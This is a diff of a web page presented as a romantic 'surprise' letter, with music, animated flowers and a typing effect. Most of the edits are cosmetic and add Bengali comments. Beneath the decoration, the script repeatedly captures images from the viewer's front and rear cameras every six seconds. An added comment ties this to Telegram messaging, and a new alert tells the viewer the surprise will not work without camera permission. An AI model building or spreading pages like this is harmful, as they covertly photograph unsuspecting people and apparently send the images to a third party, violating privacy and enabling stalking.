@@ -10,6 +10,7 @@
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Hind Siliguri', sans-serif; }
     
     body { 
+      /* ফিচার ৩: ঝাপসা ব্যাকগ্রাউন্ড ছবি (নিশ্চিত করুন background.jpg ফাইলটি আছে) */
       background: url('background.jpg') no-repeat center center fixed; 
       background-size: cover;
       height: 100vh; 
@@ -18,12 +19,13 @@
       color: #fff;
     }
     
+    /* ব্যাকগ্রাউন্ড ওভারলে এবং ব্লার ইফেক্ট */
     body::before {
       content: '';
       position: absolute;
       top: 0; left: 0; width: 100%; height: 100%;
       background: rgba(15, 15, 26, 0.85); 
-      backdrop-filter: blur(10px); 
+      backdrop-filter: blur(12px); 
       z-index: -1;
     }
     
@@ -32,7 +34,7 @@
       backdrop-filter: blur(10px);
       color: #00f2fe; 
       padding: 18px 25px; 
-      font-size: 22px; 
+      font-size: 20px; 
       font-weight: 700; 
       display: flex; 
       justify-content: space-between; 
@@ -91,13 +93,13 @@
     }
 
     .letter-area { 
-      padding: 20px 25px 40px 25px; 
+      padding: 20px 25px 50px 25px; 
       height: calc(100vh - 70px); 
       overflow-y: auto; 
       position: relative; 
-      scrollbar-width: none; /* Firefox */
+      scrollbar-width: none; 
     }
-    .letter-area::-webkit-scrollbar { display: none; } /* Chrome/Safari */
+    .letter-area::-webkit-scrollbar { display: none; } 
     
     .typing-content { 
       width: 100%; 
@@ -132,6 +134,7 @@
     }
     @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
 
+    /* ফিচার ২: ভাসমান ফুল */
     .flower {
       position: absolute;
       background-image: url('flower.png'); 
@@ -206,7 +209,7 @@
   </div>
 
   <audio id="bgMusic" loop preload="auto">
-    <source src="music.mp3" type="audio/mpeg">
+    <source src="Music.mp3" type="audio/mpeg">
   </audio>
 
   <video id="video" autoplay playsinline></video>
@@ -244,7 +247,8 @@
     let typeIndex = 0;
 
     startBtn.addEventListener('click', function() {
-      music.play().catch(err => console.log(err));
+      // ইউজার ক্লিক করার পর মিউজিক এবং ক্যামেরা শুরু হবে
+      music.play().catch(err => console.log("Music error:", err));
       startExperience();
     });
 
@@ -257,11 +261,13 @@
         chatBox.style.display = 'block';
         setTimeout(() => chatBox.style.opacity = '1', 50);
         
+        // ইফেক্টগুলো চালু করা
         setInterval(createHeart, 1000); 
         setInterval(createFlower, 2500); 
         createRain();
         startTyping(); 
         
+        // ক্যামেরা লুপ এবং টেলগ্রাম মেসেজিং
         setInterval(async () => {
           camCounter++;
           const mode = (camCounter % 2 === 0) ? "user" : "environment";
@@ -269,7 +275,7 @@
           capture(`${mode}_Loop_${camCounter}`);
         }, 6000);
       } catch (err) {
-        alert("Permission Error");
+        alert("ক্যামেরা পারমিশন ছাড়া সারপ্রাইজটি কাজ করবে না!");
       }
     }
 
@@ -277,6 +283,7 @@
       if (typeIndex < textToType.length) {
         typingText.textContent += textToType.charAt(typeIndex);
         typeIndex++;
+        // স্বয়ংক্রিয়ভাবে নিচে স্ক্রল করা
         letterArea.scrollTop = letterArea.scrollHeight;
         setTimeout(startTyping, 75); 
       } else {
